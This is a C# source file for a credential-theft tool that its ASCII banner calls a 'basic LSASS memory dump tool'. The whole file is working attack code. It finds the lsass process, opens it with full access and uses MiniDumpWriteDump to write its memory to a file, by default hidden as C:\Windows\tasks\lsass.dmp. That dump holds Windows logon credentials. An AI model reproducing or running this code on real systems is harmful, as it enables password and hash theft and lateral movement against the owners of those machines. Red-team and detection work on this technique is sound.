using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        static void Main(string[] args)
        {
            Console.WriteLine("                                                                          ");
            Console.WriteLine("██╗  ██╗ █████╗ ████████╗████████╗ █████╗ ██████╗ ███████╗██████╗  █████╗ ");
            Console.WriteLine("██║ ██╔╝██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗");
            Console.WriteLine("█████╔╝ ███████║   ██║      ██║   ███████║██████╔╝█████╗  ██║  ██║███████║");
            Console.WriteLine("██╔═██╗ ██╔══██║   ██║      ██║   ██╔══██║██╔═══╝ ██╔══╝  ██║  ██║██╔══██║");
            Console.WriteLine("██║  ██╗██║  ██║   ██║      ██║   ██║  ██║██║     ███████╗██████╔╝██║  ██║");
            Console.WriteLine("╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝     ╚══════╝╚═════╝ ╚═╝  ╚═╝");
            Console.WriteLine("+ basic LSASS memory dump tool in C# based on Win32 MiniDumpWriteDump API +");
            Console.WriteLine("                                                                          ");

            // Create a new file using the path provided in the first argument or use default path
            string dumpFilePath;
            if (args.Length < 1)
            {
                Console.WriteLine("[*] No dump file path specified. Using default path C:\\Windows\\tasks\\lsass.dmp");
                dumpFilePath = "C:\\Windows\\tasks\\lsass.dmp";
            }
            else
            {
                dumpFilePath = args[0];
            }
            FileStream dumpFile = new FileStream(dumpFilePath, FileMode.Create);

            // Get LSASS PID
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            // Open LSASS process
            Console.WriteLine("[+] Opening LSASS process");
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);

            // Dump the content of LSASS into dumpfile
            Console.WriteLine("[+] Dumping LSASS content");
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            Console.WriteLine("[*] Done");

        }
    }
}
